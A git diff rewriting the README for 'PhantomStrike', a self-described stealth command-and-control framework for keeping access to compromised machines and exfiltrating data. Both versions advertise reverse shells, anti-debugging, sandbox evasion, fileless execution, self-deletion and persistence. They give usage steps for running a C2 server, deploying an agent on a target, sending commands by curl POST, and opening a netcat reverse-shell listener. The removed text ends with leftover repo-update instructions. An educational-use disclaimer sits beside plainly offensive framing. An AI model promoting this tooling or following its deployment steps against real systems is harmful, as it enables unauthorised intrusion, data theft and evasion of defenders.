@@ -1,143 +1,165 @@
----
-
-██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███████╗
-██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗██╔════╝
-██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║███████╗
-██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║╚════██║
-██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝███████║
-╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚══════╝
-
 PhantomStrike - Stealth C2 Framework
 
-🚀 Advanced post-exploitation framework for stealth persistence, privilege escalation, and remote control.
+██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
+██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
+██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
+██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
+██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
+
+PhantomStrike - Stealth C2 Framework 🚀
+
+PhantomStrike is an advanced post-exploitation framework designed to provide stealth, persistence, privilege escalation, and remote control capabilities. It helps to maintain full access to compromised machines and exfiltrate valuable data while evading detection.
 
 
 ---
 
-🔧 Features
+Features 🔧
 
-✅ AES Encryption – Secure communication
-✅ Stealth Mode – Hides execution traces
-✅ Anti-Debugging – Evades analysis tools
-✅ Reverse Shell – Full remote access
-✅ Fileless Execution – Runs in memory
-✅ Self-Delete – Auto-removes after execution
-✅ Persistence Mode – Maintains access after reboots
+AES Encryption: Secure all communications between the agent and the C2 server.
+
+Stealth Mode: Ensures no execution traces are left behind.
+
+Anti-Debugging: Detects debuggers and terminates itself to prevent analysis.
+
+Reverse Shell: Gain full control of the target system remotely.
+
+Fileless Execution: Executes payloads entirely in memory, leaving no traces on the disk.
+
+Self-Delete: The agent deletes itself after execution to prevent detection.
+
+Persistence Mode: Ensures that access is maintained even after system reboots.
+
+Command Execution: Run arbitrary shell commands on the compromised machine.
+
+Reverse Shell Connection: Establish an interactive reverse shell with the target.
+
 
 
 ---
 
-📌 Installation
+Installation 📌
 
-1️⃣ Clone the Repo
+1️⃣ Clone the Repository:
 
 git clone https://github.com/Akkaiaj/PhantomStrike.git
 cd PhantomStrike
 
-2️⃣ Install Dependencies
+2️⃣ Install Dependencies:
+
+Ensure that you have all required libraries installed:
 
 pip install -r requirements.txt
 
 
 ---
 
-🚀 Usage
+Usage 🚀
 
 1️⃣ Start the C2 Server (Attacker Machine)
 
+Run the following command to start the PhantomStrike C2 server on your machine:
+
 python3 phantom_c2.py
 
-📌 This will start the Flask-based C2 server.
+📌 This command will launch the Flask-based C2 server and start listening for incoming agent connections.
 
 
 ---
 
 2️⃣ Deploy the Agent (Target Machine)
 
-Run the agent on the target system:
+To deploy the agent on a compromised system, simply run:
 
 python3 phantom_agent.py
 
 📌 This will:
 
-Connect to the C2 server
+Connect the agent to the C2 server.
 
-Execute commands sent from C2
+Execute commands sent from the C2 server.
 
-Start a reverse shell
+Open a reverse shell for remote control.
 
 
 
 ---
 
-🛠️ Sending Commands
+Command & Control 🛠️
 
-From the C2 server, you can send commands to the agent:
+1️⃣ Sending Commands to the Agent
+
+From the C2 server, you can send commands to the connected agent by sending a POST request:
 
 curl -X POST http://your-server-ip:5000/command -H "Content-Type: application/json" -d '{"command": "whoami"}'
 
-📌 The agent will execute this command and send back the result.
+📌 The agent will execute the given command and send the results back to the C2 server.
 
 
 ---
 
-🔥 Reverse Shell Usage
+2️⃣ Reverse Shell Usage 🔥
 
-Once the agent is running, connect to the reverse shell from the C2 machine:
+Once the agent is connected, establish a reverse shell by running:
 
 nc -lvnp 4444
 
-📌 Now you have full control over the target system!
+📌 This will give you full control over the target system.
 
 
 ---
 
-🕵️‍♂️ Evasion & Persistence
+Evasion & Persistence 🕵️‍♂️
 
-Anti-Debugging: Detects debuggers and terminates itself.
+Anti-Debugging: PhantomStrike detects when debuggers are present and terminates to avoid analysis.
 
-Self-Delete: Deletes itself after execution to remove traces.
+Self-Delete: The agent cleans up after execution, leaving no traces on the disk.
 
-Persistence Mode: Runs at startup for continued access.
-
-
-
----
-
-🛡️ Defensive Measures
-
-Uses AES encryption to secure command communication
-
-Evades sandbox detection & monitoring tools
-
-Implements polymorphic obfuscation for stealth
+Persistence Mode: PhantomStrike can be configured to run automatically after system reboots, ensuring continuous access.
 
 
 
 ---
 
-💰 Donate & Support
+Defensive Measures 🛡️
 
-If you find PhantomStrike useful, consider donating:
+AES Encryption: All communication between the agent and C2 server is encrypted to avoid detection.
+
+Evasion: The tool implements polymorphic obfuscation to make the payload harder to detect by sandboxing or monitoring tools.
+
+Anti-Sandbox: PhantomStrike bypasses common sandbox detection mechanisms.
+
+
+
+---
+
+Donations 💰
+
+If you find PhantomStrike useful, consider supporting the project to help fund its continuous development:
+
+
+*buy me a coffe 
 
 BTC: bc1q0ruwrc4gs465xvu6tcn24h62pclt96sh2yv8pq
+
 ETH: 0x69B6F3aA9F470d4cBD93CDC4c0A887C0787CEf9B
+
 SOL: Gk6CmvvS6fi1Nfnu7QEEneshbLkmaE5Ue8sBzxz91D3q
 
 
 ---
 
-💀 Disclaimer
+License 📜
 
-This tool is for educational and ethical hacking purposes only. Unauthorized use is illegal.
+PhantomStrike is open-source software and licensed under the MIT License. By using this tool, you agree to the terms of this license.
 
 
 ---
 
-✅ Now update your GitHub repo with this README:
+⚠️ Disclaimer
 
-cd ~/PhantomStrike
-nano README.md  # Replace with new content
-git add README.md
-git commit -m "Updated README with detailed usage and ASCII art"
-git push origin main
+This tool is intended for educational purposes and ethical hacking only. Any unauthorized use of this tool against systems without consent is illegal and unethical. Please ensure you have permission to use this tool before deploying it.
+
+
+---
+
